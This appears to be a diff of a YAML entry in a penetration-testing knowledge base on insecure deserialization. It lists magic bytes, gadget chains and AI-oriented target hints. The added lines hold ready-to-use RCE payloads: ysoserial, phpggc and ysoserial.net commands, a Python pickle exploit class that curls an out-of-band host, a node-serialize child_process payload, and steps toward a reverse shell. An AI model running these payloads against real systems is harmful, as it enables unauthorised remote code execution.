@@ -1,24 +1,84 @@
 id: DESERIALIZATION
-name: Insecure Deserialization
+name: Insecure Deserialization — Comprehensive
 cwe:
 - CWE-502
-owasp: A08:2021 Software and Data Integrity Failures
-severity_range: High - Critical
-description: Application deserializes untrusted data, potentially allowing RCE, authentication bypass, or data tampering.
+owasp: A08:2021 Software Integrity Failures
+severity_range: Critical
+description: Deserializing untrusted data leads to RCE via gadget chains. Present in Java (Java Object), Python (pickle),
+  PHP (unserialize), .NET (BinaryFormatter, ViewState), Ruby (Marshal), and Node.js (node-serialize).
 detection:
   indicators:
-  - 'Java: base64 ''rO0AB'' prefix, Content-Type: application/x-java-serialized-object'
-  - 'PHP: serialized strings starting with O:, a:, s:, i:'
-  - 'Python: pickle (\x80\x03), base64-encoded pickle in cookies/params'
-  - '.NET: TypeNameHandling in JSON, VIEWSTATE, BinaryFormatter'
-  - 'Ruby: Marshal.load indicators'
+  - Base64-encoded data in cookies or parameters
+  - 'Magic bytes: AC ED (Java), gAS (Python pickle), O: (PHP), AAEAAAD (.NET)'
+  - X-Serialized-Data headers
+  - Type-confused deserialization errors in responses
   strategy:
-  - 1. Identify serialized data in cookies, hidden fields, API params
-  - 2. Recognize serialization format (Java, PHP, Python pickle, .NET)
-  - 3. Modify serialized data — does the app error or accept it?
-  - 4. Generate malicious payloads with ysoserial (Java), phpggc (PHP)
-  - 5. Test for blind deserialization via DNS/HTTP callbacks
-evidence_needed: RCE via deserialization gadget chain, or data integrity bypass
+  - 1. Decode any base64 cookies/params, look for serialization magic bytes
+  - 2. Identify language/framework via decoded content
+  - 3. Use ysoserial/ysoserial.net to generate RCE payloads
+  - 4. Submit malicious payload, observe response
+  - 5. For blind, use OOB callback in gadget chain
+  language_specific:
+    java:
+      magic_bytes: AC ED 00 05 (rO0AB in base64)
+      tools:
+      - ysoserial
+      gadget_chains:
+      - CommonsCollections1-7
+      - Spring1-2
+      - Hibernate1-2
+      - JBossInterceptors1
+      - JRMPClient
+      - JSON1
+      command: java -jar ysoserial.jar CommonsCollections7 'curl http://oob/' | base64
+    python_pickle:
+      magic_bytes: Starts with 80 (cPickle) or gASV (pickle protocol 2+)
+      exploitation:
+      - "import pickle\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('curl http://oob/',))\npayload\
+        \ = base64.b64encode(pickle.dumps(Exploit()))"
+    php:
+      magic_bytes: 'Starts with O: or a:'
+      exploitation:
+      - Find magic methods (__wakeup, __destruct, __toString) in app classes
+      - 'Build gadget chain: instantiate exploitable class with malicious properties'
+      - Use phpggc tool for known frameworks
+      command: phpggc Laravel/RCE1 'system' 'id' -b
+    dotnet:
+      magic_bytes: AAEAAAD///// (BinaryFormatter)
+      tools:
+      - ysoserial.net
+      command: ysoserial.net.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'calc'
+    ruby:
+      magic_bytes: Marshal.dump output
+      exploitation: Use Universal Gadget for Ruby 2.x-3.x
+    nodejs:
+      package: node-serialize
+      payload: '{"rce":"_$$ND_FUNC$$_function(){require(''child_process'').exec(''id'', function(error, stdout, stderr) {
+        console.log(stdout) });}()"}'
+exploitation:
+  rce_via_gadget:
+  - Identify framework version (Spring, Struts, Apache Commons version)
+  - Use ysoserial appropriate to framework
+  - Generate payload with OOB callback to confirm execution
+  - Once confirmed, generate payload with reverse shell
+  blind_via_oob:
+  - Generate payload that performs HTTP/DNS callback
+  - Submit, monitor OOB server
+  - Confirms execution without visible response
+ai_research_hints:
+- Java ViewState (JSF, Spring) is very high-yield — base64 cookie usually exploitable
+- .NET __VIEWSTATE often has known machineKey leaks via /web.config disclosure
+- Python pickle in Django sessions (when SESSION_SERIALIZER set to pickle) = trivial RCE
+- Caching layers (Redis, Memcached) sometimes serialize via pickle — poison cache for RCE
+- 'Look for vulnerable libs: log4j (Log4Shell), Jackson polymorphic deser, fastjson, snakeyaml'
+- GraphQL persisted queries cache may use unsafe deserialization
+tools:
+- ysoserial
+- ysoserial.net
+- phpggc
+- marshalsec
+- GadgetInspector
 references:
-- https://portswigger.net/web-security/deserialization
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
+- https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
+- https://github.com/frohoff/ysoserial
+- https://book.hacktricks.xyz/pentesting-web/deserialization
